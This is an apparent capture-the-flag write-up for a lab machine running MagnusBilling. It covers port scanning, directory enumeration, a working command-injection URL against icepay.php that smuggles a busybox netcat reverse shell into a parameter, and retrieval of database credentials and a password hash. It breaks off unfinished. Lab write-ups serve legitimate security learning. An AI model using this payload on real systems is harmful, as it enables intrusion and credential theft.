# Billing

### Billing
Nmap scan finds ports 22,80,.3306 and 5038 open. 

    PORT     STATE SERVICE  VERSION
    22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
    | ssh-hostkey: 
    |   3072 79:ba:5d:23:35:b2:f0:25:d7:53:5e:c5:b9:af:c0:cc (RSA)
    |   256 4e:c3:34:af:00:b7:35:bc:9f:f5:b0:d2:aa:35:ae:34 (ECDSA)
    |_  256 26:aa:17:e0:c8:2a:c9:d9:98:17:e4:8f:87:73:78:4d (ED25519)
    80/tcp   open  http     Apache httpd 2.4.56 ((Debian))
    | http-title:             MagnusBilling        
    |_Requested resource was http://10.10.51.171/mbilling/
    |_http-server-header: Apache/2.4.56 (Debian)
    | http-robots.txt: 1 disallowed entry 
    |_/mbilling/
    3306/tcp open  mysql    MariaDB (unauthorized)
    5038/tcp open  asterisk Asterisk Call Manager 2.10.6
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Gobuster discovers the following directories: <br />
![image](https://github.com/user-attachments/assets/2660e71b-f82e-486d-b403-eadb74210d1c)<br />
Moving around the website and enumerating directories, I found the following file: <br />
![image](https://github.com/user-attachments/assets/6de3594e-1895-41e4-88a5-c83865d05457)<br />
It means that some software called `MagnusBilling` is running. 
Looking around, I found [this website](https://sploitus.com/exploit?id=1337DAY-ID-39148) that shows a metasploit module to perform command injection. I'm actually not even sure if it works because I don't know how to check the version of this software, but anyway I'll try. <br />
I don't like metasploit really so I'll do it manually. The exploit is basically a command injection on a vulnerable php parameter. To exploit it, I open a netcat listener on port 9001 and then run:

    10.10.26.88/mbilling/lib/icepay/icepay.php?democ=/dev/null;busybox nc 10.11.85.53 9001 -e sh;#
This opens a reverse shell! Moving around the system, I found a configuration file containing a database password: <br />
![image](https://github.com/user-attachments/assets/9514e13a-e182-4f19-b21a-73589dc75bea)<br />
I use this credentials to log into the database. Looking around the DB I found a password: <br />
![image](https://github.com/user-attachments/assets/2ca1144d-1641-482e-924d-381b54baf72d)<br />
I'm having difficulties trying to crack this hash... TO BE CONTINUED...
![image](https://github.com/user-attachments/assets/831652bb-701c-421a-988b-8b54366f8652)
![image](https://github.com/user-attachments/assets/968e51b7-0ccd-44b0-8adf-fd2909a42452)
![image](https://github.com/user-attachments/assets/0ba82b85-6b0a-4c2f-8651-93303e189085)
![image](https://github.com/user-attachments/assets/9f1f540d-dbd7-4d38-ad2d-fb8d9a419036)

![image](https://github.com/user-attachments/assets/ef192e87-76be-413f-8392-2df98978bed1)
![image](https://github.com/user-attachments/assets/a08a6555-26a9-45b8-9769-10888100474e)

